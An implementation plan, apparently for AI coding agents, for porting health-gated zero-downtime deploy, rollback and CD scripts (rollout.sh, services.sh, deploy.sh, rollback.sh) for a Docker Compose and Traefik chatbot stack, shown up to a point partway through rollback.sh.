# Zero-Downtime Deploy, Rollback and CD Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Give the meta-repo a health-gated rolling deploy with automatic rollback, driven by `cd.yml` on every merge to `main`, plus the runbooks needed to provision a host and cut over from the old VPS.

**Architecture:** `scripts/lib/rollout.sh` holds application-agnostic rolling-replacement primitives that talk only to Docker and to Traefik's container-local API; it is exercised by a stub-based test suite with no daemon. `scripts/lib/services.sh` is the one place the chatbot's rolled-service table lives, consumed by both `deploy.sh` and `rollback.sh` so the count a preflight proves and the count a roll demands cannot drift. `cd.yml` waits for CI, verifies both images exist in GHCR, rsyncs the deployment tree to the server and runs `deploy.sh` over SSH; `rollback.yml` is a separate workflow so a rollback can never be a skipped job on a green run.

**Tech Stack:** Bash 5, Docker Compose v2 (v5.4.0 on the dev host), Traefik v3.6.25 file+docker providers, GitHub Actions, GHCR, `shellcheck`, `actionlint`.

**Spec:** `chatbot_api/docs/superpowers/specs/2026-09-03-infrastructure-pipeline-design.md` (§5.3, §5.4, §5.5, §6, §7, §8)

**Reference implementation:** `~/Projects/original_software` — `scripts/`, `.github/workflows/cd.yml`, `.github/workflows/rollback.yml`. Several files here are near-verbatim ports. Where a file is a port, this plan names the source path and lists **every** adaptation; do not re-derive the logic, and do not "improve" ported comments — they document fixed production incidents and travel with the code.

## Global Constraints

- **Repository:** `github.com/Etqan-agency/chatbot` (the meta-repo). Work from `/home/abdulkhalek/Projects/chatbot`. Submodules `chatbot_api` and `chatbot_dashboard` are **not** touched by this plan.
- **Images:** `ghcr.io/etqan-agency/chatbot/api` and `ghcr.io/etqan-agency/chatbot/dashboard`. Exactly two. Registry prefix `etqan-agency/chatbot`, lowercase.
- **Compose project name is `chatbot`.** Task 1 pins it with a top-level `name:` key. Every container is therefore `chatbot-<service>-<n>`, and Traefik's container is `chatbot-traefik-1`, regardless of what `DEPLOY_PATH`'s basename is on the server.
- **Rolled services are `web` (2 replicas) and `dashboard` (2 replicas), in that order.** `worker` is rolled separately as a non-Traefik service. `media`, `db`, `redis`, `traefik` and `socket-proxy` are never rolled.
- **Traefik service names** (the `<name>` in `traefik.http.services.<name>`) are `web`, `dashboard`, `media`. Note the router names differ (`api`, `app`, `media`) — the rollout code queries **service** names.
- **Traefik's API** is container-local at `http://127.0.0.1:8080/api` and is reachable only via `docker exec` into the Traefik container. `wget` is present in that image; `curl` is not.
- **`web`'s stop timeout is 40s**, because gunicorn's `--graceful-timeout` is 30 and a 30s stop lands SIGKILL at the instant gunicorn finishes draining.
- **`SECURE_SSL_REDIRECT` must stay `False`.** Traefik terminates TLS and health-probes over plain HTTP; a redirect would make the drain gate stop gating. Carried forward from Plan 2.
- **`RUN_MIGRATIONS` is never set on any service.** Migrations run as an explicit one-off container in `deploy.sh`.
- Bash scripts: `#!/usr/bin/env bash`, `set -euo pipefail`, and must pass `shellcheck` with no suppressions beyond the ones this plan names explicitly.
- Never write a secret into an `ssh` command argument. `ssh` runs its argument remotely as `bash -c "<string>"`, which puts it in the server's process table.

---

## File Structure

| File | Responsibility |
|---|---|
| `docker-compose.production.yml` | *(modify)* pin the project name; add `stop_grace_period` to `worker` |
| `scripts/lib/rollout.sh` | Application-agnostic rolling primitives. Knows Docker and Traefik; knows nothing about the chatbot. |
| `scripts/lib/rollout.test.sh` | Stub-based test suite for the above. No daemon, no network. |
| `scripts/lib/services.sh` | The chatbot's rolled-service table. The single definition both the preflight and the rolls read. |
| `scripts/deploy.sh` | The deploy sequence: preflight → pull → data tier → backup → migrate → roll → smoke → record. |
| `scripts/rollback.sh` | Roll images back to a previous tag. Reconciles rather than refuses. Never touches the data tier. |
| `scripts/sync-service-labels.sh` | The escape hatch `assert_service_labels` points at: one brief-outage recreate to bring running replicas up to the current labels. |
| `.github/workflows/cd.yml` | wait-for-ci → verify-images → deploy. |
| `.github/workflows/rollback.yml` | Manual-dispatch rollback. Separate workflow by design. |
| `.github/workflows/ci.yml` | *(modify)* add `infra-lint` and `rollout-tests`, both gated on `changes.outputs.infra`, and wire them into `CI Summary`. |
| `docs/DEPLOY.md` | Provisioning runbook, deploy/rollback operations, cutover checklist, known residuals. |

---

## Task 1: Rolling primitives and their test suite

The whole plan rests on this file. It is ported, not written, and the port is
proved by a test suite that runs with a stubbed `docker` binary — no daemon, no
containers, no network. Everything downstream assumes these primitives behave
exactly as the reference's do.

**Files:**
- Create: `scripts/lib/rollout.sh` (port of `~/Projects/original_software/scripts/lib/rollout.sh`)
- Create: `scripts/lib/rollout.test.sh` (port of `~/Projects/original_software/scripts/lib/rollout.test.sh`)
- Modify: `docker-compose.production.yml` (add top-level `name:`, add `worker.stop_grace_period`)

**Interfaces produced** (Tasks 2 and 3 depend on these exact names):

```
COMPOSE_FILE           env, default docker-compose.production.yml
TRAEFIK_CONTAINER      env, default chatbot-traefik-1
TRAEFIK_API            env, default http://127.0.0.1:8080/api
DRAIN_SETTLE_SECS      env, default 15
HEALTH_TIMEOUT_SECS    env, default 180
BACKEND_TIMEOUT_SECS   env, default 120

service_containers      <service>                                   -> newline-separated names
count_names             <newline-separated-list>                    -> integer
service_replica_count   <service>                                   -> integer
container_health        <container>                                 -> "healthy"|"none:running"|...
wait_containers_healthy <timeout> <container>...                    -> 0 | 1
traefik_backends_up     <traefik-service-name>                      -> "URL STATUS" lines
wait_backends_up        <service> <expected> <timeout>              -> 0 | 1
retire_container        <container> <stop_timeout> <true|false>     -> 0
reconcile_command       <service> <steady>                          -> the command string
container_service_labels <container>                               -> sorted traefik.http.services.* lines
desired_service_labels  <service>                                   -> same, from the rendered compose file
service_labels_match    <service>                                   -> 0 | 1
assert_service_labels   "<svc> <steady> <to> <drainable>"...        -> 0 | 1
assert_steady_replicas  "<svc> <steady> <to> <drainable>"...        -> 0 | 1
reconcile_service       <service> <steady>                          -> 0 | 1
roll_service            <service> <steady> <stop_timeout> <true|false> -> 0 | 1 | 2
roll_worker             <service> <stop_timeout>                    -> 0 | 1
```

- [ ] **Step 1: Pin the compose project name**

Without this, the compose project name is the basename of the working
directory: `chatbot` here, but `DEPLOY_PATH`'s basename on the server, which is
a secret this code cannot see. `service_containers` greps a fixed prefix, so an
unpinned name means the rollout finds zero containers on the server and every
roll refuses with "expected 2 replicas, found 0".

Add as the very first line of `docker-compose.production.yml`:

```yaml
# Pins the compose project name, and with it every container name.
# scripts/lib/rollout.sh matches containers by the `chatbot-<service>-<n>`
# prefix and execs into `chatbot-traefik-1`. Left unpinned, the project name is
# the basename of the deploy directory -- which on the server is DEPLOY_PATH,
# a secret this repo cannot see. Every roll would then find zero containers.
name: chatbot

networks:
```

- [ ] **Step 2: Give `worker` a stop grace period**

`roll_worker` passes `docker stop -t 360`, which overrides the compose value at
the call site — but a `docker compose down`, a host reboot or a manual restart
does not go through `roll_worker` and would use the 10s default, killing a
worker mid-task. Add to the `worker` service, directly under `command:`:

```yaml
    # Celery treats SIGTERM as a warm shutdown: finish the current task, stop
    # prefetching, exit. The default 10s SIGKILLs mid-task. roll_worker passes
    # -t 360 explicitly; this covers every path that does not (compose down,
    # host reboot, manual restart).
    stop_grace_period: 360s
```

- [ ] **Step 3: Verify the compose file still renders**

```bash
cd /home/abdulkhalek/Projects/chatbot
docker compose -f docker-compose.production.yml config >/dev/null && echo RENDER_OK
docker compose -f docker-compose.production.yml config --format json \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["name"])'
```

Expected: `RENDER_OK`, then `chatbot`.

- [ ] **Step 4: Port `rollout.sh`**

```bash
cp ~/Projects/original_software/scripts/lib/rollout.sh \
   /home/abdulkhalek/Projects/chatbot/scripts/lib/rollout.sh
```

Then apply **exactly these five changes** and nothing else. Comments in the
file document real incidents; keep them, adjusting only names and the
application-specific facts called out below.

1. `TRAEFIK_CONTAINER` default: `original-software-traefik-1` → `chatbot-traefik-1`.
2. `service_containers`: the grep prefix `^original-software-${1}-` → `^chatbot-${1}-`.
3. The `HEALTH_TIMEOUT_SECS` comment says "django's compose healthcheck declares
   start_period: 40s and interval: 30s". Ours is the image's own `HEALTHCHECK`.
   Replace that comment with:

   ```bash
   # The api image's HEALTHCHECK declares start_period 40s and interval 30s, so a
   # cold web container needs ~70s before its first passing probe is recorded.
   HEALTH_TIMEOUT_SECS="${HEALTH_TIMEOUT_SECS:-180}"
   ```

4. In `retire_container`, the `drainable=false` branch's comment describes two
   Next.js apps. Replace that comment block with:

   ```bash
   # NOT a drain, and deliberately not pretending to be one. `dashboard` is a
   # static nginx: its Traefik healthcheck probes `/`, which nginx answers 200
   # until the process dies, so a marker file would change nothing and touching
   # one would only make this code look safer than it is. We stop the container
   # and rely on Traefik removing it from the pool via the Docker event stream.
   # A small number of requests already dispatched to this replica in that
   # instant ARE dropped. Accepted residual; see docs/DEPLOY.md.
   ```

5. In `retire_container`, the `drainable=true` branch's comment names
   `backend/config/api_router.py`. Change that reference to
   `chatbot_api/Conf/views.py`, which is where our drain-aware `health` view
   lives. The `touch /tmp/drain` path itself is unchanged — Django reads it from
   `settings.DRAIN_FILE`, whose default is `/tmp/drain`.

Do **not** change: the `docker exec ... wget -qO- "${TRAEFIK_API}/http/services/${service}@docker"`
call, the `python3` label-parsing heredoc, `reconcile_command`'s `--no-recreate`,
or any of the function signatures.

- [ ] **Step 5: Port the test suite**

```bash
cp ~/Projects/original_software/scripts/lib/rollout.test.sh \
   /home/abdulkhalek/Projects/chatbot/scripts/lib/rollout.test.sh
sed -i 's/original-software-/chatbot-/g; s/\bdjango\b/web/g; s/\bceleryworker\b/worker/g' \
   /home/abdulkhalek/Projects/chatbot/scripts/lib/rollout.test.sh
```

Then **cut out the end-to-end block.** It runs `scripts/deploy.sh` and
`scripts/rollback.sh`, which are Task 2 deliverables and do not exist yet, and
it asserts against the reference's service table (`frontend`, `pgbouncer`,
`backend/.envs/.production`), so it needs real adaptation rather than a rename.
Task 2 ports it.

It is a **block in the middle of the file, not a tail.** After it comes a second
banner-boxed section testing `service_labels_match` and `assert_service_labels`
— two of your own functions, with no dependency on the deploy scripts — followed
by the summary and exit lines. Keep that. Cut only from the
`End-to-end: deploy.sh and rollback.sh against the same stubbed docker` banner
up to, but not including, the banner that opens
`service_labels_match: the guard for Traefik's "one service, one definition"`.

```bash
cd /home/abdulkhalek/Projects/chatbot
python3 - <<'EOF'
import re, pathlib
p = pathlib.Path('scripts/lib/rollout.test.sh')
lines = p.read_text().splitlines(keepends=True)
start = next(i for i, l in enumerate(lines)
             if 'End-to-end: deploy.sh and rollback.sh' in l)
end   = next(i for i, l in enumerate(lines)
             if 'service_labels_match: the guard for Traefik' in l)
# both banners are the second line of a `# ---...` box; back up over the opener
while lines[start-1].startswith('# ---'): start -= 1
while lines[end-1].startswith('# ---'):   end -= 1
p.write_text(''.join(lines[:start] + lines[end:]))
print(f"cut lines {start+1}-{end}")
EOF
tail -3 scripts/lib/rollout.test.sh
grep -c 'deploy\.sh\|rollback\.sh' scripts/lib/rollout.test.sh
```

Expected: a `cut lines …` line, a `tail` showing the `passed:`/`failed:` summary
and the `[ "$FAIL" -eq 0 ]` exit line still present, and `0` references to
`deploy.sh` or `rollback.sh` remaining.

`frontend` and `dashboard` appear in the multi-service fixtures. **Leave them.**
`rollout.sh` is application-agnostic and so are its fixtures; the assertions
that use `frontend` are testing that a wrong replica count on a *non-first*
service is still reported, and renaming them buys nothing. Add this to the file
header so the next reader does not "fix" it:

```bash
# Some fixture service names (frontend, dashboard) do not correspond to services
# in docker-compose.production.yml. That is deliberate: rollout.sh is
# application-agnostic, so its tests use arbitrary names to prove it stays that
# way. The real service table lives in services.sh and is tested by deploying.
```

- [ ] **Step 6: Run the test suite — this is the gate**

```bash
cd /home/abdulkhalek/Projects/chatbot
bash scripts/lib/rollout.test.sh
```

Expected: every line begins `ok   - `, a final summary line reading exactly `passed: 56  failed: 0`, and exit
status 0.

56, not 76: the 20 end-to-end assertions moved to Task 2 with the block that
contains them. 49 come from the primitives section and 7 from the label-parity
section that follows the cut.

If any test fails, the port is wrong — fix `rollout.sh`, not the test. The one
exception: a test asserting on a literal container name the sed missed. Check
`grep -n 'original-software' scripts/lib/rollout.test.sh` returns nothing.

- [ ] **Step 7: Shellcheck both files**

```bash
shellcheck -x scripts/lib/rollout.sh scripts/lib/rollout.test.sh
```

The reference `rollout.test.sh` is **not** shellcheck-clean as shipped: its
`cd "$(dirname "$0")"` raises `SC2164` and its `source ./rollout.sh` raises
`SC1091`. Task 4 makes `shellcheck -x scripts/lib/*.sh` a blocking CI gate, so
fix both — they are one line each and both are genuine improvements:

```bash
# SC2164: an unguarded cd that fails would run the whole suite in the wrong
#         directory against the real filesystem.
cd "$(dirname "$0")" || exit 1

# SC1091: tell shellcheck where the sourced file is, so -x can follow it.
# shellcheck source=rollout.sh
source ./rollout.sh
```

These are the only two edits to the ported test file beyond the `sed` and the
truncation. `rollout.sh` itself is already clean and keeps its exactly-five
adaptations.

Expected after the fixes: no output, exit 0. `rollout.sh` carries `# shellcheck disable=SC2086`
on the two deliberate word-split lines (`wait_containers_healthy ... $new` and
`roll_service $spec`); those come with the port. If `shellcheck` is not
installed, install it (`sudo apt-get install -y shellcheck`) rather than
skipping — Task 4 makes it a CI gate. `sudo apt-get` may prompt for a password
in this environment; if it does, install the static binary release from
`github.com/koalaman/shellcheck/releases` instead.

- [ ] **Step 8: Commit**

```bash
cd /home/abdulkhalek/Projects/chatbot
git add scripts/lib/rollout.sh scripts/lib/rollout.test.sh docker-compose.production.yml
git commit -m "feat: port rolling-replacement primitives and their test suite

Application-agnostic Docker + Traefik rolling primitives, ported from
original_software with names adapted to this stack. Pins the compose project
name to 'chatbot' so container matching does not depend on DEPLOY_PATH's
basename, and gives the celery worker a 360s stop_grace_period so paths that
do not go through roll_worker still get a warm shutdown.

56/56 unit-level stub-based tests passing; no daemon required. The suite's
20 end-to-end assertions exercise deploy.sh and rollback.sh and land in Task 2
with those scripts."
```

---

## Task 2: The service table, deploy and rollback scripts

**Files:**
- Create: `scripts/lib/services.sh`
- Create: `scripts/deploy.sh`
- Create: `scripts/rollback.sh`
- Create: `scripts/sync-service-labels.sh`

**Interfaces:**
- Consumes: every function from Task 1's `rollout.sh`, plus `COMPOSE_FILE`.
- Produces: `APP_SERVICES` (array of `"<svc> <steady> <stop_timeout> <drainable>"`),
  and the CLI contracts `deploy.sh <image_tag> [--skip-backup] [--dry-run] [--skip-pull]`
  and `rollback.sh [image_tag]`, which Task 3's workflows invoke verbatim.

- [ ] **Step 1: Write `scripts/lib/services.sh`**

```bash
#!/usr/bin/env bash
# The application's Traefik-fronted service table. Sourced by deploy.sh and
# rollback.sh; deliberately NOT part of rollout.sh, which stays app-agnostic.
#
# ONE definition, used for both the preflight replica assertion and the rolls
# themselves, so the count the preflight proves and the count roll_service
# demands cannot drift apart.
#
# Each entry is "<service> <steady> <stop_timeout> <drainable>", in roll order:
#
#   steady        replicas the service runs at outside a rollout. Must match
#                 `deploy.replicas` in docker-compose.production.yml.
#   stop_timeout  seconds given to SIGTERM before SIGKILL. web is 40, not 30:
#                 gunicorn's --graceful-timeout is 30, so -t 30 lands SIGKILL at
#                 the exact instant gunicorn would have finished draining.
#   drainable     whether the app has a drain-aware health route -- one that
#                 returns 503 while DRAIN_FILE exists, so Traefik pulls the
#                 replica from rotation before it is stopped. Only web does:
#                 chatbot_api/Conf/views.py's `health`. A service marked true
#                 here MUST have that route in the image being deployed, or
#                 retire_container waits out the settle window against a probe
#                 that never fails and the stop is as abrupt as before.
#
# ORDER MATTERS, and not only for the usual reason. The dashboard's nginx
# proxies /api/ straight to `web:8000` over Docker DNS, bypassing Traefik, and
# caches that resolution for 10s. Retiring a web replica therefore leaves up to
# 10s of dead IPs in each running dashboard container's resolver cache. Rolling
# `dashboard` immediately afterwards replaces those containers with ones that
# have empty caches, which bounds the exposure to the gap between the two rolls
# rather than to the DNS TTL of long-lived containers. See docs/DEPLOY.md.
APP_SERVICES=(
  "web 2 40 true"
  "dashboard 2 30 false"
)

# Read one key from the server's .env. Deliberately not `source .env`: that file
# is compose syntax, not bash, and a value containing a space or an unbalanced
# quote would abort a deploy on the source line, before the preflight can say
# anything useful.
envval() { grep -E "^${1}=" .env 2>/dev/null | head -1 | cut -d= -f2- | tr -d "\"'" ; }

# The probes that gate a deploy and verify a rollback, as "<url>|<want>".
# ONE definition, so a rollback can never verify less than the deploy gated on.
#
# The media probe is not optional: it is the only check that exercises the
# priority router and the shared volume mount, and /media/ is the one route that
# silently regressed when the all-in-one nginx was replaced.
smoke_probes() {
  local domain="$1" media_path="$2"
  printf '%s\n' \
    "https://api.${domain}/health/|200" \
    "https://app.${domain}/|200" \
    "https://api.${domain}/media/${media_path}|200"
}

# `media` is deliberately absent. It is a single replica serving a read-only
# volume mount with no in-flight application state, and its image and config
# change only when the deployment config does. It is brought up alongside the
# data tier with --no-deps, not rolled. Adding it here would demand a second
# replica and a drain route for a static file server that has neither reason
# for one.
```

- [ ] **Step 2: Write `scripts/deploy.sh`**

This is a port of `~/Projects/original_software/scripts/deploy.sh` with the
adaptations below written in. Read that file alongside this step; every comment
in it that survives here is load-bearing.

```bash
#!/usr/bin/env bash
# Production deploy. Run ON the server, from ${DEPLOY_PATH}:
#   bash scripts/deploy.sh <image_tag> [--skip-backup] [--dry-run] [--skip-pull] < /dev/null
#
# This exists as a transferred script rather than an inline SSH heredoc because
# a heredoc is read from stdin: any command that also reads stdin swallows the
# rest of the script, and the deploy stops silently while reporting success.
set -euo pipefail
cd "$(dirname "$0")/.."
# shellcheck source=lib/rollout.sh
source scripts/lib/rollout.sh
# shellcheck source=lib/services.sh
source scripts/lib/services.sh

IMAGE_TAG="${1:?usage: deploy.sh <image_tag> [--skip-backup] [--dry-run] [--skip-pull]}"
shift || true
SKIP_BACKUP=false; DRY_RUN=false; SKIP_PULL=false
for arg in "$@"; do
  case "$arg" in
    --skip-backup) SKIP_BACKUP=true ;;
    --dry-run)     DRY_RUN=true ;;
    # For rehearsals against locally-built images, and for re-running a deploy
    # whose images are already on the host after a mid-deploy abort. CD never
    # passes it: a production deploy must prove the tag exists in the registry.
    --skip-pull)   SKIP_PULL=true ;;
    *) echo "unknown argument: $arg" >&2; exit 2 ;;
  esac
done
export IMAGE_TAG
STATE_FILE=.release-state

# The smoke checks need the deployed hostnames, which live in the server's .env
# (hand-written at provisioning, never in Git). envval and smoke_probes come
# from services.sh, so a rollback reads the same values through the same code.
DOMAIN="$(envval DOMAIN)"
[ -n "$DOMAIN" ] || { echo "DOMAIN is not set in .env" >&2; exit 1; }
MEDIA_PROBE_PATH="$(envval MEDIA_PROBE_PATH)"
MEDIA_PROBE_PATH="${MEDIA_PROBE_PATH:-probe/health.txt}"
# Set during a local rehearsal to e.g. "-k --resolve api.chatbot.local:443:127.0.0.1".
# Empty in production, where the hostnames resolve and the certificate is real.
SMOKE_CURL_EXTRA="${SMOKE_CURL_EXTRA:-}"

echo "=========================================="
echo "Deploy ${IMAGE_TAG}  skip_backup=${SKIP_BACKUP}  dry_run=${DRY_RUN}  skip_pull=${SKIP_PULL}"
echo "=========================================="

echo ">>> preflight"
[ -f "$COMPOSE_FILE" ] || { echo "missing $COMPOSE_FILE" >&2; exit 1; }
[ -f .env ] || { echo "missing .env" >&2; exit 1; }
[ -f media/nginx.conf ] || { echo "missing media/nginx.conf (bind-mounted by the media service)" >&2; exit 1; }
[ -f traefik/traefik.yml ] || { echo "missing traefik/traefik.yml" >&2; exit 1; }
avail_mb=$(free -m | awk '/Mem:/ {print $7}')
[ "$avail_mb" -ge 1200 ] || { echo "only ${avail_mb}MiB available; refusing" >&2; exit 1; }
echo "available memory: ${avail_mb}MiB"

# The rolling swap health-gates on Traefik's API. That API is enabled by a
# traefik.yml change that does NOT hot-reload -- it needs a manual container
# restart. Without this check the deploy would get all the way past migrate and
# the worker roll before wait_backends_up timed out 120s per service, leaving
# web mid-rollout. Fail here, before anything has changed.
if [ -z "$(traefik_backends_up web)" ]; then
  echo "ERROR: Traefik's API reported no backends for web." >&2
  echo "       Most likely traefik/traefik.yml's API change has not been applied:" >&2
  echo "       it is static config and does NOT hot-reload. On the server run:" >&2
  echo "         docker compose -f ${COMPOSE_FILE} up -d --no-deps --force-recreate traefik" >&2
  echo "       (container ${TRAEFIK_CONTAINER}, API ${TRAEFIK_API})" >&2
  exit 1
fi
echo "traefik API reachable; web backends registered"

# Every roll_service call below refuses unless the service is at exactly its
# steady replica count. Prove that for ALL of them here, while the system is
# still untouched -- otherwise a dashboard left at the wrong count by an
# interrupted run aborts the deploy only after the backup, collectstatic,
# migrate, the worker roll and the whole web roll, leaving the new schema and a
# new web live against an old dashboard with no automatic remedy.
#
# The deploy deliberately does NOT repair this itself: a silent repair would
# hide the interruption. Reconciling is the rollback path's job (and the
# operator's -- the command is in the message and in docs/DEPLOY.md).
echo ">>> checking replica counts"
assert_steady_replicas "${APP_SERVICES[@]}" || exit 1

# Traefik discards a service whose containers declare different service
# definitions, and a roll runs two generations at once -- so a deploy that
# changes a traefik.http.services.* label would 404 that host for the whole
# rollout. Detected here, before anything is created; no later gate can see it.
echo ">>> checking service-label parity"
assert_service_labels "${APP_SERVICES[@]}" || exit 1

if [ "$SKIP_PULL" != true ]; then
  echo ">>> pulling images"
  docker compose -f "$COMPOSE_FILE" pull
else
  echo ">>> skipping pull (--skip-pull)"
fi

if [ "$DRY_RUN" = true ]; then echo ">>> dry run: images pulled, stopping here"; exit 0; fi

# Data tier: ensure up, NEVER recreate. Recreating postgres drops every
# connection held by the running web and worker containers.
echo ">>> data tier (no recreate)"
docker compose -f "$COMPOSE_FILE" up -d --no-recreate db redis
for i in $(seq 1 30); do
  if docker compose -f "$COMPOSE_FILE" exec -T db pg_isready </dev/null >/dev/null 2>&1; then
    echo "postgres ready"; break
  fi
  [ "$i" -eq 30 ] && { echo "postgres never became ready" >&2; exit 1; }
  sleep 2
done

echo ">>> socket proxy and media"
docker compose -f "$COMPOSE_FILE" up -d --no-deps socket-proxy media

if [ "$SKIP_BACKUP" != true ]; then
  # pgvector/pgvector:pg16 is the stock Postgres image and has no `backup`
  # helper script, so this is a plain pg_dump into the pgbackups volume. Run
  # inside the container: the volume is not mounted anywhere else.
  echo ">>> database backup"
  pg_user="$(envval POSTGRES_USER)"; pg_user="${pg_user:-chatbot}"
  pg_db="$(envval POSTGRES_DB)";     pg_db="${pg_db:-chatbot}"
  stamp="$(date -u +%Y%m%dT%H%M%SZ)"
  docker compose -f "$COMPOSE_FILE" exec -T db \
    sh -c "pg_dump -U '${pg_user}' -d '${pg_db}' | gzip > /backups/${pg_db}-${stamp}.sql.gz" \
    </dev/null || echo "WARNING: backup failed"
  # Keep the last 14. Deleting oldest-first by name works because the stamp is
  # ISO-8601 basic and therefore lexicographically ordered.
  docker compose -f "$COMPOSE_FILE" exec -T db \
    sh -c 'ls -1 /backups/*.sql.gz 2>/dev/null | head -n -14 | xargs -r rm -f' \
    </dev/null || true
fi

# -l traefik.enable=false: a one-off `compose run` container inherits its
# service's labels, so without this it joins the web backend pool with nothing
# listening on :8000 and Traefik 502s a share of traffic.
echo ">>> collectstatic (before the swap: hashed names let old and new coexist)"
docker compose -f "$COMPOSE_FILE" run --rm --no-deps -l traefik.enable=false -T \
  web python manage.py collectstatic --noinput </dev/null

echo ">>> migrate"
docker compose -f "$COMPOSE_FILE" run --rm --no-deps -l traefik.enable=false -T \
  web python manage.py migrate --noinput </dev/null

# Write the media smoke probe through `web` (which mounts media_volume rw) so
# the smoke check reads it back through `media` (which mounts it ro). That makes
# the probe prove the shared volume, not just that nginx is up -- and /media/ is
# the one route that silently regressed when the all-in-one nginx was replaced.
echo ">>> media probe object"
docker compose -f "$COMPOSE_FILE" run --rm --no-deps -l traefik.enable=false -T \
  web sh -c "mkdir -p \"\$(dirname /app/media/${MEDIA_PROBE_PATH})\" && printf ok > /app/media/${MEDIA_PROBE_PATH}" </dev/null

# Consumers before producers: web dispatches Celery messages, and a new producer
# can send a kwarg an old consumer's signature rejects.
echo ">>> rolling worker"
roll_worker worker 360

# Same table the preflight asserted against, in roll order. Per-service steady
# counts, stop timeouts and drainability are documented in scripts/lib/services.sh.
for spec in "${APP_SERVICES[@]}"; do
  # shellcheck disable=SC2086  # the spec is a deliberate word-split argument list
  roll_service $spec
done

echo ">>> smoke checks"
smoke_failed=false
# Process substitution, not a pipe: a pipe would run the loop in a subshell and
# smoke_failed would never escape it, so every failed deploy would look clean.
while IFS= read -r probe; do
  url=${probe%%|*}; want=${probe##*|}
  # shellcheck disable=SC2086  # SMOKE_CURL_EXTRA is a deliberate argument list
  # `|| true`, not `|| echo 000`: curl already prints 000 on a connection
  # failure AND exits non-zero, so `|| echo 000` yields the string "000000".
  # It still fails the comparison, but it reads as a bug in the probe.
  got=$(curl -s -o /dev/null -m 15 -w '%{http_code}' $SMOKE_CURL_EXTRA "$url" || true)
  echo "  ${url} -> ${got} (want ${want})"
  [ "$got" = "$want" ] || smoke_failed=true
done < <(smoke_probes "$DOMAIN" "$MEDIA_PROBE_PATH")

if [ "$smoke_failed" = true ]; then
  # Roll back to CURRENT, not PREVIOUS.
  #
  # .release-state is deliberately not written until the smoke checks pass, so
  # while this deploy is failing the file still describes the PREVIOUS release:
  # its CURRENT is the tag that was serving before this run started, and its
  # PREVIOUS is the one before that. Reading PREVIOUS here is off by one
  # release, and wrong in two distinct ways:
  #
  #   * After the very first deploy the file is `CURRENT=v1 PREVIOUS=`, so a
  #     failing second deploy finds nothing to roll back to and leaves the
  #     broken release serving -- with a known-good tag sitting in the file.
  #   * After `CURRENT=v2 PREVIOUS=v1`, a failing v3 rolls back to v1, skipping
  #     v2 entirely. The expand/contract rule that makes an image-only rollback
  #     safe holds for ONE release, so v1's code would then run against v3's
  #     migrated schema -- the exact hazard rollback.sh says cannot happen.
  #
  # The PREVIOUS fallback stays for the case where a hand-edited or partially
  # written state file has no CURRENT.
  rollback_target=$(grep '^CURRENT=' "$STATE_FILE" 2>/dev/null | cut -d= -f2 || true)
  [ -n "$rollback_target" ] || \
    rollback_target=$(grep '^PREVIOUS=' "$STATE_FILE" 2>/dev/null | cut -d= -f2 || true)
  echo "ERROR: smoke checks failed." >&2
  if [ -n "$rollback_target" ]; then
    echo ">>> rolling back to ${rollback_target}" >&2
    bash scripts/rollback.sh "$rollback_target" </dev/null
  else
    echo "No usable tag in ${STATE_FILE}; manual intervention required." >&2
  fi
  exit 1
fi

# Recorded only after smoke checks pass, so PREVIOUS is always a tag that was
# observed serving traffic.
prev_current=$(grep '^CURRENT=' "$STATE_FILE" 2>/dev/null | cut -d= -f2 || true)
{ echo "CURRENT=${IMAGE_TAG}"; echo "PREVIOUS=${prev_current}"; } > "$STATE_FILE"
echo ">>> release state: CURRENT=${IMAGE_TAG} PREVIOUS=${prev_current}"

docker image prune -f >/dev/null
echo "=========================================="
echo "Deploy complete"
docker compose -f "$COMPOSE_FILE" ps
```

- [ ] **Step 3: Write `scripts/rollback.sh`**

```bash
#!/usr/bin/env bash
# Roll production back to a previous tag, using the same primitive as a deploy.
#   bash scripts/rollback.sh [image_tag] < /dev/null
# With no argument, rolls back to PREVIOUS from .release-state.
#
# Never touches db or redis. Schema is deliberately NOT reverted: under the
# expand/contract rule, release N's schema is compatible with release N-1's
# code, so reverting the images alone is correct.
set -euo pipefail
cd "$(dirname "$0")/.."
# shellcheck source=lib/rollout.sh
source scripts/lib/rollout.sh
# shellcheck source=lib/services.sh
source scripts/lib/services.sh

STATE_FILE=.release-state
TARGET="${1:-}"
if [ -z "$TARGET" ]; then
  TARGET=$(grep '^PREVIOUS=' "$STATE_FILE" 2>/dev/null | cut -d= -f2 || true)
  [ -n "$TARGET" ] || { echo "no tag given and no PREVIOUS in ${STATE_FILE}" >&2; exit 2; }
  echo ">>> no tag given; using PREVIOUS=${TARGET}"
fi
export IMAGE_TAG="$TARGET"

# envval and smoke_probes come from services.sh.
DOMAIN="$(envval DOMAIN)"
[ -n "$DOMAIN" ] || { echo "DOMAIN is not set in .env" >&2; exit 1; }
MEDIA_PROBE_PATH="$(envval MEDIA_PROBE_PATH)"; MEDIA_PROBE_PATH="${MEDIA_PROBE_PATH:-probe/health.txt}"
SMOKE_CURL_EXTRA="${SMOKE_CURL_EXTRA:-}"

echo ">>> rolling back to ${TARGET}"
# Name the services explicitly. Only web, worker and dashboard interpolate
# IMAGE_TAG; a bare `pull` would also re-pull the pinned third-party images,
# which is slower and gives a rollback more ways to fail during an incident.
docker compose -f "$COMPOSE_FILE" pull web worker dashboard

# Unlike the deploy, rollback RECONCILES instead of refusing.
#
# roll_service will not touch a service that is not at its steady replica count,
# and the state that most often needs a rollback is precisely an interrupted
# roll that left a service at double replicas. Refusing here would block the
# recovery path with the condition it exists to recover from, mid-incident. So
# bring each service back to steady first -- loudly, never silently -- and then
# roll. The deploy path keeps the strict assertion: only rollback repairs.
#
# Both first, so a service that cannot be reconciled aborts before any rolling
# starts. After the pull, so a scale-up has the target image locally.
echo ">>> reconciling replica counts before rolling"
for spec in "${APP_SERVICES[@]}"; do
  read -r svc steady _ <<<"$spec"
  reconcile_service "$svc" "$steady"
done

# Consumers before producers, same as the deploy: a still-new web may dispatch
# messages the older worker must tolerate.
roll_worker worker 360

# Same table and roll order as the deploy; see scripts/lib/services.sh.
for spec in "${APP_SERVICES[@]}"; do
  # shellcheck disable=SC2086  # the spec is a deliberate word-split argument list
  roll_service $spec
done

echo ">>> verifying"
while IFS= read -r probe; do
  url=${probe%%|*}; want=${probe##*|}
  # shellcheck disable=SC2086  # SMOKE_CURL_EXTRA is a deliberate argument list
